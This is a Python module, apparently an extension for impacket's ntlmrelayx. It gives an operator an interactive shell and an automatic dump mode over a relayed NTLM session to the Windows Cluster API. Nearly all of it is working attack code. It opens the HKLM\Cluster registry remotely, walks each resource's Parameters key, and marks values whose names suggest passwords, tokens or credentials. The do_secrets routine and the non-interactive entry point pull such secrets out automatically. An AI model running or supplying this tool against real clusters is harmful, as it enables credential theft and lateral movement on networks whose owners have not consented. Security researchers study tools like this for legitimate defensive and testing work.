#!/usr/bin/env python3
r"""
clusapi.py  –  MS-CMRP (Cluster API) interactive shell for ntlmrelayx.

Provides fustercluck-style operations over a relayed NTLM session to
the clusapi RPC interface (B97DB8B2-4C63-11CF-BFF6-08002BE23F2F v3.0).

Attack flow:
  1. ntlmrelayx relays captured NTLM auth to MS-CMRP on the cluster target.
  2. The relayed session is passed here as an already-bound DCERPC handle.
  3. An interactive cmd shell lets the operator enumerate nodes, resources,
     read cluster registry keys (HKLM\Cluster), and dump secrets.

MS-CMRP opnums used (subset):
    0  ApiOpenCluster             → HCLUSTER_RPC
    6  ApiCloseCluster
   11  ApiOpenResource            → HRES_RPC
   12  ApiCreateResource
   14  ApiCloseResource
   15  ApiGetResourceState
    7  ApiGetClusterName
   24  ApiNodeControl
   30  ApiResourceControl / ApiResourceTypeControl
   36  ApiOpenKey                 → HKEY_RPC (cluster registry)
   37  ApiEnumKey
   38  ApiSetValue / 39 ApiDeleteValue
   40  ApiQueryValue
   41  ApiCloseKey
   66  ApiGetResourceId
  147  ApiOpenResourceEx

References:
  [MS-CMRP] https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cmrp/
  fustercluck  – Garrett Foster / SpecterOps
"""

import struct
import cmd
import sys

from impacket import LOG

# ---------------------------------------------------------------------------
#  Low-level NDR helpers (hand-rolled because there is no impacket .idl for
#  clusapi — we build the request bodies with raw struct packing).
# ---------------------------------------------------------------------------

def _ndr_wstring(s):
    """
    Pack a conformant+varying UNICODE string in NDR format.
    Used for ApiOpenResource, ApiOpenKey, etc.
    """
    encoded = s.encode('utf-16-le') + b'\x00\x00'
    char_count = len(encoded) // 2
    # MaximumCount | Offset | ActualCount | data
    return struct.pack('<III', char_count, 0, char_count) + encoded

def _ndr_wstring_aligned(s):
    """Same as _ndr_wstring but adds pad to 4-byte alignment."""
    data = _ndr_wstring(s)
    pad = (4 - (len(data) % 4)) % 4
    return data + b'\x00' * pad

def _read_ndr_wstring(data, offset=0):
    """Read a conformant+varying unicode string from raw NDR bytes."""
    max_count = struct.unpack_from('<I', data, offset)[0]
    offset += 4
    _ofs      = struct.unpack_from('<I', data, offset)[0]
    offset += 4
    actual    = struct.unpack_from('<I', data, offset)[0]
    offset += 4
    byte_len  = actual * 2
    raw = data[offset:offset + byte_len]
    offset += byte_len
    # strip null terminator
    result = raw.decode('utf-16-le', errors='replace').rstrip('\x00')
    # align to 4
    pad = (4 - (byte_len % 4)) % 4
    offset += pad
    return result, offset

def _read_context_handle(data, offset=0):
    """Read a 20-byte RPC context handle."""
    return data[offset:offset+20], offset + 20


# ---------------------------------------------------------------------------
#  ClusAPI RPC opnum constants (MS-CMRP section 3.1.4)
# ---------------------------------------------------------------------------
OPNUM_ApiOpenCluster          = 0
OPNUM_ApiCloseCluster         = 6
OPNUM_ApiGetClusterName       = 7
OPNUM_ApiOpenResource         = 11
OPNUM_ApiCloseResource        = 14
OPNUM_ApiGetResourceState     = 15
OPNUM_ApiOpenKey              = 36
OPNUM_ApiEnumKey              = 37
OPNUM_ApiQueryValue           = 40
OPNUM_ApiCloseKey             = 41
OPNUM_ApiEnumValue            = 42
OPNUM_ApiGetResourceId        = 66
OPNUM_ApiOpenResourceEx       = 147
OPNUM_ApiGetResourceType      = 74

# Resource state constants
RESOURCE_STATES = {
    0: 'Inherited',
    1: 'Initializing',
    2: 'Online',
    3: 'Offline',
    4: 'Failed',
    128: 'Pending',
    129: 'OnlinePending',
    130: 'OfflinePending',
}

# Cluster registry value types (same as Win32 REG_*)
REG_TYPES = {
    0: 'REG_NONE',
    1: 'REG_SZ',
    2: 'REG_EXPAND_SZ',
    3: 'REG_BINARY',
    4: 'REG_DWORD',
    7: 'REG_MULTI_SZ',
    11: 'REG_QWORD',
}


# ---------------------------------------------------------------------------
#  High-level ClusAPI wrapper
# ---------------------------------------------------------------------------

class ClusAPISession:
    """
    Wraps call/recv on a bound DCERPC session for MS-CMRP operations.
    """

    def __init__(self, dce):
        self.dce = dce
        self.hCluster = None   # HCLUSTER_RPC — 20-byte context handle
        self.hRootKey = None   # Context handle for the root registry key

    # -- RPC helpers --------------------------------------------------------

    def _call(self, opnum, body=b''):
        """Send an RPC request and return the raw response bytes."""
        self.dce.call(opnum, body)
        raw = self.dce.recv()
        if isinstance(raw, bytes):
            return raw
        # Some impacket versions return an NDRCall response — get raw data
        return raw

    # -- Cluster-level operations -------------------------------------------

    def open_cluster(self):
        """ApiOpenCluster (opnum 0) — returns HCLUSTER_RPC handle."""
        resp = self._call(OPNUM_ApiOpenCluster, b'')
        # Response: HCLUSTER_RPC (20 bytes) + error_status_t (4 bytes)
        if len(resp) < 24:
            raise Exception("ApiOpenCluster response too short (%d bytes)" % len(resp))
        self.hCluster = resp[:20]
        status = struct.unpack_from('<I', resp, 20)[0]
        if status != 0:
            raise Exception("ApiOpenCluster failed with status 0x%08x" % status)
        LOG.info("CLUSAPI: ApiOpenCluster succeeded")
        return self.hCluster

    def close_cluster(self):
        """ApiCloseCluster (opnum 6)."""
        if self.hCluster is None:
            return
        try:
            self._call(OPNUM_ApiCloseCluster, self.hCluster)
        except Exception:
            pass
        self.hCluster = None

    def get_cluster_name(self):
        """
        ApiGetClusterName (opnum 7) — returns (ClusterName, NodeName).
        No input params (the cluster handle is implicit in the binding context).
        """
        resp = self._call(OPNUM_ApiGetClusterName, b'')
        # Response: two embedded RPC unicode strings + error_status_t
        # The easiest parse: scan for utf-16 patterns
        try:
            cluster_name, off = _read_ndr_wstring(resp, 0)
            # skip referent id for second pointer
            off += 4  # referent pointer id for NodeName
            node_name, off = _read_ndr_wstring(resp, off)
            return cluster_name, node_name
        except Exception:
            # Fallback: decode the whole blob
            try:
                text = resp.decode('utf-16-le', errors='replace').rstrip('\x00')
                return text, ''
            except Exception:
                return repr(resp), ''

    # -- Resource operations ------------------------------------------------

    def open_resource(self, name):
        """ApiOpenResource (opnum 11) — returns HRES_RPC context handle."""
        body = _ndr_wstring(name)
        resp = self._call(OPNUM_ApiOpenResource, body)
        if len(resp) < 24:
            raise Exception("ApiOpenResource response too short (%d bytes)" % len(resp))
        hResource = resp[:20]
        status = struct.unpack_from('<I', resp, 20)[0]
        if status != 0:
            raise Exception("ApiOpenResource('%s') failed: 0x%08x" % (name, status))
        return hResource

    def close_resource(self, hResource):
        """ApiCloseResource (opnum 14)."""
        try:
            self._call(OPNUM_ApiCloseResource, hResource)
        except Exception:
            pass

    def get_resource_state(self, hResource):
        """
        ApiGetResourceState (opnum 15).
        Returns (state_int, state_str, node_name, group_name).
        """
        resp = self._call(OPNUM_ApiGetResourceState, hResource)
        # Response: State (4 bytes) + NodeName_ptr + GroupName_ptr + rpc_status
        if len(resp) < 4:
            raise Exception("GetResourceState response too short")
        state = struct.unpack_from('<I', resp, 0)[0]
        state_str = RESOURCE_STATES.get(state, 'Unknown(%d)' % state)
        # Try to parse node/group names
        node_name = ''
        group_name = ''
        try:
            off = 4
            # referent id for NodeName
            off += 4
            node_name, off = _read_ndr_wstring(resp, off)
            # referent id for GroupName
            off += 4
            group_name, off = _read_ndr_wstring(resp, off)
        except Exception:
            pass
        return state, state_str, node_name, group_name

    def get_resource_id(self, hResource):
        """ApiGetResourceId (opnum 66) — returns the GUID string."""
        resp = self._call(OPNUM_ApiGetResourceId, hResource)
        try:
            rid, _ = _read_ndr_wstring(resp, 0)
            return rid
        except Exception:
            return repr(resp)

    # -- Cluster registry operations ----------------------------------------

    def open_key(self, hKey, subkey_name):
        """
        ApiOpenKey (opnum 36).
        Opens a subkey under hKey and returns a new HKEY_RPC handle.
        """
        # Body: hKey (20) + LPCWSTR name
        body = hKey + _ndr_wstring(subkey_name)
        # samDesired — KEY_READ = 0x20019
        body += struct.pack('<I', 0x20019)
        resp = self._call(OPNUM_ApiOpenKey, body)
        if len(resp) < 24:
            raise Exception("ApiOpenKey response too short")
        hSubKey = resp[:20]
        status = struct.unpack_from('<I', resp, 20)[0]
        if status != 0:
            raise Exception("ApiOpenKey('%s') failed: 0x%08x" % (subkey_name, status))
        return hSubKey

    def close_key(self, hKey):
        """ApiCloseKey (opnum 41)."""
        try:
            self._call(OPNUM_ApiCloseKey, hKey)
        except Exception:
            pass

    def enum_key(self, hKey, index):
        """
        ApiEnumKey (opnum 37) — enumerate subkey at index.
        Returns subkey name or None if no more entries.
        """
        body = hKey + struct.pack('<I', index)
        try:
            resp = self._call(OPNUM_ApiEnumKey, body)
        except Exception:
            return None
        # Response: LPCWSTR KeyName + FILETIME + rpc_status
        try:
            status = struct.unpack_from('<I', resp, len(resp) - 4)[0]
            if status == 0x103:  # ERROR_NO_MORE_ITEMS
                return None
            if status != 0 and status != 0x103:
                return None
            name, _ = _read_ndr_wstring(resp, 0)
            return name
        except Exception:
            return None

    def enum_all_keys(self, hKey):
        """Enumerate all subkeys under hKey."""
        keys = []
        idx = 0
        while True:
            name = self.enum_key(hKey, idx)
            if name is None:
                break
            keys.append(name)
            idx += 1
        return keys

    def query_value(self, hKey, value_name):
        """
        ApiQueryValue (opnum 40) — read a registry value.
        Returns (type_int, raw_bytes).
        """
        # Body: hKey (20) + LPCWSTR ValueName + cbData (max buffer)
        body = hKey + _ndr_wstring(value_name)
        body += struct.pack('<I', 65536)  # max buffer size
        # On the wire: also need cbData pointer
        body += struct.pack('<I', 65536)  # cbRequired
        try:
            resp = self._call(OPNUM_ApiQueryValue, body)
        except Exception as e:
            raise Exception("ApiQueryValue('%s') failed: %s" % (value_name, e))
        # Response varies — attempt parse: dwType (4) + cbData (4) + data + rpc_status
        if len(resp) < 8:
            raise Exception("ApiQueryValue response too short (%d)" % len(resp))
        # Try: first 4 bytes = type, next 4 = conformant array max_count, then data
        val_type = struct.unpack_from('<I', resp, 0)[0]
        # conformant byte array: max_count (4) + data
        max_count = struct.unpack_from('<I', resp, 4)[0]
        # Some responses may have additional size fields
        if max_count < len(resp):
            raw_data = resp[8:8 + max_count]
        else:
            raw_data = resp[8:]
        return val_type, raw_data

    def enum_value(self, hKey, index):
        """
        ApiEnumValue (opnum 42) — enumerate value at index.
        Returns (name, type, raw_bytes) or None.
        """
        body = hKey + struct.pack('<I', index)
        # cbValueName buffer + cbData buffer
        body += struct.pack('<I', 1024)  # max value name
        body += struct.pack('<I', 65536)  # max data
        try:
            resp = self._call(OPNUM_ApiEnumValue, body)
        except Exception:
            return None
        # Find status at end
        if len(resp) < 4:
            return None
        status = struct.unpack_from('<I', resp, len(resp) - 4)[0]
        if status == 0x103 or status == 0x2A7:  # NO_MORE_ITEMS or similar
            return None
        try:
            name, off = _read_ndr_wstring(resp, 0)
            val_type = struct.unpack_from('<I', resp, off)[0]
            off += 4
            data_len = struct.unpack_from('<I', resp, off)[0]
            off += 4
            raw = resp[off:off + data_len]
            return name, val_type, raw
        except Exception:
            return None

    def enum_all_values(self, hKey):
        """Enumerate all values under hKey."""
        values = []
        idx = 0
        while True:
            result = self.enum_value(hKey, idx)
            if result is None:
                break
            values.append(result)
            idx += 1
        return values

    def open_root_key(self):
        """Open the cluster root registry key (HKLM\\Cluster)."""
        if self.hCluster is None:
            self.open_cluster()
        # ApiOpenKey with the cluster handle as the parent key and empty string
        # opens the root \Cluster key
        body = self.hCluster + _ndr_wstring('')
        body += struct.pack('<I', 0x20019)  # KEY_READ
        resp = self._call(OPNUM_ApiOpenKey, body)
        if len(resp) < 24:
            raise Exception("ApiOpenKey (root) response too short")
        self.hRootKey = resp[:20]
        status = struct.unpack_from('<I', resp, 20)[0]
        if status != 0:
            raise Exception("ApiOpenKey (root) failed: 0x%08x" % status)
        LOG.info("CLUSAPI: Opened root cluster registry key")
        return self.hRootKey


# ---------------------------------------------------------------------------
#  Helpers for pretty-printing registry values
# ---------------------------------------------------------------------------

def format_reg_value(val_type, raw):
    """Format a raw registry value for display."""
    type_name = REG_TYPES.get(val_type, 'TYPE(%d)' % val_type)
    if val_type in (1, 2):  # REG_SZ, REG_EXPAND_SZ
        try:
            return type_name, raw.decode('utf-16-le').rstrip('\x00')
        except Exception:
            return type_name, repr(raw)
    elif val_type == 4:  # REG_DWORD
        if len(raw) >= 4:
            return type_name, str(struct.unpack('<I', raw[:4])[0])
        return type_name, repr(raw)
    elif val_type == 11:  # REG_QWORD
        if len(raw) >= 8:
            return type_name, str(struct.unpack('<Q', raw[:8])[0])
        return type_name, repr(raw)
    elif val_type == 7:  # REG_MULTI_SZ
        try:
            decoded = raw.decode('utf-16-le').rstrip('\x00')
            parts = decoded.split('\x00')
            return type_name, ' | '.join(parts)
        except Exception:
            return type_name, repr(raw)
    elif val_type == 3:  # REG_BINARY
        if len(raw) <= 64:
            return type_name, raw.hex()
        return type_name, raw[:64].hex() + '...'
    else:
        return type_name, repr(raw)


# ---------------------------------------------------------------------------
#  Interactive fustercluck-style shell
# ---------------------------------------------------------------------------

class ClusAPIShell(cmd.Cmd):
    """
    Interactive shell for cluster operations via relayed MS-CMRP session.
    Mirrors fustercluck's interactive capabilities.
    """

    intro = (
        "\n"
        "=" * 70 + "\n"
        "  MS-CMRP (Cluster API) Interactive Shell\n"
        "  Relayed NTLM session — fustercluck-style operations\n"
        "  Type 'help' for available commands.\n"
        "=" * 70 + "\n"
    )
    prompt = "CLUSAPI> "

    def __init__(self, session):
        """
        session: ClusAPISession with an already-bound DCE/RPC handle.
        """
        super().__init__()
        self.session = session
        self._current_key_path = ''
        self._current_hKey = None

    # -- Shell lifecycle ----------------------------------------------------

    def preloop(self):
        try:
            self.session.open_cluster()
        except Exception as e:
            LOG.error("Failed to open cluster: %s" % e)
            print("[-] ApiOpenCluster failed: %s" % e)
            print("[-] Some commands may not work.")

    def postloop(self):
        if self._current_hKey:
            self.session.close_key(self._current_hKey)
        self.session.close_cluster()
        print("\n[*] Session closed.")

    # -- Cluster info commands ----------------------------------------------

    def do_info(self, _args):
        """Get cluster name and connected node."""
        try:
            cluster_name, node_name = self.session.get_cluster_name()
            print("  Cluster : %s" % cluster_name)
            print("  Node    : %s" % node_name)
        except Exception as e:
            print("[-] Error: %s" % e)

    # -- Resource commands --------------------------------------------------

    def do_resource(self, args):
        """resource <name>  — Open a resource and show its state."""
        name = args.strip()
        if not name:
            print("Usage: resource <resource_name>")
            return
        try:
            hRes = self.session.open_resource(name)
            state, state_str, node, group = self.session.get_resource_state(hRes)
            rid = self.session.get_resource_id(hRes)
            print("  Resource : %s" % name)
            print("  ID       : %s" % rid)
            print("  State    : %s (%d)" % (state_str, state))
            print("  Node     : %s" % node)
            print("  Group    : %s" % group)
            self.session.close_resource(hRes)
        except Exception as e:
            print("[-] Error: %s" % e)

    # -- Registry commands (fustercluck-style) ------------------------------

    def do_regopen(self, _args):
        """Open the root cluster registry key (HKLM\\Cluster)."""
        try:
            self.session.open_root_key()
            self._current_hKey = self.session.hRootKey
            self._current_key_path = 'Cluster'
            print("[+] Opened root key: HKLM\\Cluster")
        except Exception as e:
            print("[-] Error: %s" % e)

    def do_cd(self, args):
        """cd <subkey>  — Navigate into a registry subkey."""
        subkey = args.strip()
        if not subkey:
            print("Current key: HKLM\\%s" % (self._current_key_path or '(none — run regopen first)'))
            return
        if self._current_hKey is None:
            print("[-] No key open. Run 'regopen' first.")
            return
        if subkey == '..':
            print("[!] Going up is not supported in this RPC model. Use 'regopen' + 'cd' from root.")
            return
        try:
            hNew = self.session.open_key(self._current_hKey, subkey)
            # Close old key if it's not the root
            if self._current_hKey != self.session.hRootKey:
                self.session.close_key(self._current_hKey)
            self._current_hKey = hNew
            self._current_key_path = self._current_key_path + '\\' + subkey
            print("[+] HKLM\\%s" % self._current_key_path)
        except Exception as e:
            print("[-] Error opening subkey '%s': %s" % (subkey, e))

    def do_ls(self, _args):
        """List subkeys and values of the current registry key."""
        if self._current_hKey is None:
            print("[-] No key open. Run 'regopen' first.")
            return
        print("  HKLM\\%s" % self._current_key_path)
        print()
        # Subkeys
        try:
            keys = self.session.enum_all_keys(self._current_hKey)
            if keys:
                print("  Subkeys:")
                for k in keys:
                    print("    [DIR]  %s" % k)
            else:
                print("  (no subkeys)")
        except Exception as e:
            print("  [-] Error enumerating subkeys: %s" % e)
        print()
        # Values
        try:
            values = self.session.enum_all_values(self._current_hKey)
            if values:
                print("  Values:")
                for name, vtype, raw in values:
                    type_str, val_str = format_reg_value(vtype, raw)
                    display_name = name if name else '(Default)'
                    print("    %-30s  %-16s  %s" % (display_name, type_str, val_str))
            else:
                print("  (no values)")
        except Exception as e:
            print("  [-] Error enumerating values: %s" % e)

    def do_cat(self, args):
        """cat <value_name>  — Read a specific registry value."""
        vname = args.strip()
        if not vname:
            print("Usage: cat <value_name>")
            return
        if self._current_hKey is None:
            print("[-] No key open. Run 'regopen' first.")
            return
        try:
            vtype, raw = self.session.query_value(self._current_hKey, vname)
            type_str, val_str = format_reg_value(vtype, raw)
            print("  %s = %s (%s)" % (vname, val_str, type_str))
            if vtype == 3 and len(raw) > 64:
                print("  Full hex (%d bytes):" % len(raw))
                # Hex dump
                for i in range(0, len(raw), 16):
                    chunk = raw[i:i+16]
                    hex_part = ' '.join('%02x' % b for b in chunk)
                    ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
                    print("    %04x: %-48s  %s" % (i, hex_part, ascii_part))
        except Exception as e:
            print("[-] Error: %s" % e)

    def do_dump(self, args):
        """
        dump [subkey]  — Recursively dump all values under the current key
        (or optionally a subkey). Looks for secrets, passwords, credentials.
        """
        subkey = args.strip()
        if self._current_hKey is None:
            print("[-] No key open. Run 'regopen' first.")
            return
        if subkey:
            try:
                hKey = self.session.open_key(self._current_hKey, subkey)
                path = self._current_key_path + '\\' + subkey
            except Exception as e:
                print("[-] Error: %s" % e)
                return
        else:
            hKey = self._current_hKey
            path = self._current_key_path
        self._recursive_dump(hKey, path, depth=0)
        if subkey:
            self.session.close_key(hKey)

    def _recursive_dump(self, hKey, path, depth=0):
        """Recursively enumerate and print all values."""
        indent = '  ' * depth
        print("%s[%s]" % (indent, path))
        try:
            values = self.session.enum_all_values(hKey)
            for name, vtype, raw in values:
                type_str, val_str = format_reg_value(vtype, raw)
                display_name = name if name else '(Default)'
                # Highlight potential secrets
                marker = ''
                low_name = display_name.lower()
                if any(kw in low_name for kw in ['password', 'secret', 'credential', 'key', 'token', 'private']):
                    marker = ' <<<'
                print("%s  %-28s  %-14s  %s%s" % (indent, display_name, type_str, val_str, marker))
        except Exception as e:
            print("%s  [-] Error enumerating values: %s" % (indent, e))
        # Recurse into subkeys
        try:
            subkeys = self.session.enum_all_keys(hKey)
            for sk in subkeys:
                try:
                    hSub = self.session.open_key(hKey, sk)
                    self._recursive_dump(hSub, path + '\\' + sk, depth + 1)
                    self.session.close_key(hSub)
                except Exception as e:
                    print("%s  [-] Cannot open '%s': %s" % (indent, sk, e))
        except Exception:
            pass

    def do_secrets(self, _args):
        """
        Attempt to dump secrets from Cluster\\Resources — the primary target.
        This navigates Resources\\<GUID>\\Parameters for each resource and
        dumps values that may contain credentials (SQL SA passwords,
        virtual machine broker creds, generic service credentials, etc.).
        """
        if self.session.hRootKey is None:
            try:
                self.session.open_root_key()
                self._current_hKey = self.session.hRootKey
                self._current_key_path = 'Cluster'
            except Exception as e:
                print("[-] Cannot open root key: %s" % e)
                return
        print("[*] Dumping Cluster\\Resources for secrets...")
        print()
        try:
            hResources = self.session.open_key(self.session.hRootKey, 'Resources')
        except Exception as e:
            print("[-] Cannot open Resources key: %s" % e)
            return
        try:
            guids = self.session.enum_all_keys(hResources)
            for guid in guids:
                try:
                    hGuid = self.session.open_key(hResources, guid)
                    # Read resource type name if available
                    res_type = ''
                    try:
                        vtype, raw = self.session.query_value(hGuid, 'Type')
                        _, res_type = format_reg_value(vtype, raw)
                    except Exception:
                        pass
                    # Read name
                    res_name = ''
                    try:
                        vtype, raw = self.session.query_value(hGuid, 'Name')
                        _, res_name = format_reg_value(vtype, raw)
                    except Exception:
                        pass

                    header = "Resource: %s  [%s]  Type: %s" % (res_name or '(unnamed)', guid, res_type or '(unknown)')
                    print("=" * len(header))
                    print(header)
                    print("=" * len(header))

                    # Dump all values at this level
                    try:
                        values = self.session.enum_all_values(hGuid)
                        if values:
                            for name, vt, raw in values:
                                ts, vs = format_reg_value(vt, raw)
                                dn = name if name else '(Default)'
                                print("  %-28s  %-14s  %s" % (dn, ts, vs))
                    except Exception:
                        pass

                    # Try Parameters subkey (this is where secrets live)
                    try:
                        hParams = self.session.open_key(hGuid, 'Parameters')
                        print("  --- Parameters ---")
                        self._recursive_dump(hParams, 'Resources\\%s\\Parameters' % guid, depth=1)
                        self.session.close_key(hParams)
                    except Exception:
                        pass  # no Parameters subkey

                    print()
                    self.session.close_key(hGuid)
                except Exception as e:
                    print("  [-] Error processing %s: %s" % (guid, e))
        except Exception as e:
            print("[-] Error enumerating resource GUIDs: %s" % e)
        self.session.close_key(hResources)

    # -- Utility commands ---------------------------------------------------

    def do_raw(self, args):
        """raw <opnum> [hex_body]  — Send a raw RPC call (advanced)."""
        parts = args.strip().split(None, 1)
        if not parts:
            print("Usage: raw <opnum> [hex_body]")
            return
        try:
            opnum = int(parts[0])
        except ValueError:
            print("[-] Invalid opnum")
            return
        body = b''
        if len(parts) > 1:
            try:
                body = bytes.fromhex(parts[1].replace(' ', ''))
            except ValueError:
                print("[-] Invalid hex body")
                return
        try:
            resp = self.session._call(opnum, body)
            print("[+] Response (%d bytes):" % len(resp))
            for i in range(0, len(resp), 16):
                chunk = resp[i:i+16]
                hex_part = ' '.join('%02x' % b for b in chunk)
                ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
                print("  %04x: %-48s  %s" % (i, hex_part, ascii_part))
        except Exception as e:
            print("[-] RPC call failed: %s" % e)

    def do_exit(self, _args):
        """Exit the interactive shell."""
        return True

    def do_quit(self, _args):
        """Exit the interactive shell."""
        return True

    do_EOF = do_exit

    def emptyline(self):
        pass


# ---------------------------------------------------------------------------
#  Entry point — called from RPCAttack when endpoint == "CLUSAPI"
# ---------------------------------------------------------------------------

def run_clusapi_attack(config, dce, username, interactive=False):
    """
    Main entry point for the CLUSAPI relay attack.

    If interactive (-i flag in ntlmrelayx):  launch the ClusAPIShell.
    Otherwise:  auto-dump secrets from Cluster\\Resources.
    """
    session = ClusAPISession(dce)

    if interactive:
        LOG.info("CLUSAPI: Launching interactive shell for %s" % username)
        shell = ClusAPIShell(session)
        try:
            shell.cmdloop()
        except KeyboardInterrupt:
            print("\n[*] Interrupted.")
        except Exception as e:
            LOG.error("CLUSAPI shell error: %s" % e)
    else:
        # Non-interactive: auto-dump
        LOG.info("CLUSAPI: Auto-dumping cluster secrets for %s" % username)
        print()
        print("=" * 70)
        print("  MS-CMRP Cluster Secret Dump (relayed as: %s)" % username)
        print("=" * 70)
        print()
        try:
            session.open_cluster()
            try:
                cluster_name, node_name = session.get_cluster_name()
                print("  Cluster : %s" % cluster_name)
                print("  Node    : %s" % node_name)
            except Exception:
                pass
            print()
            session.open_root_key()
        except Exception as e:
            LOG.error("Failed to connect to cluster: %s" % e)
            print("[-] Failed: %s" % e)
            return

        # Dump Resources
        shell = ClusAPIShell(session)
        shell._current_hKey = session.hRootKey
        shell._current_key_path = 'Cluster'
        shell.do_secrets('')

        session.close_cluster()
        print()
        print("[*] Dump complete.")
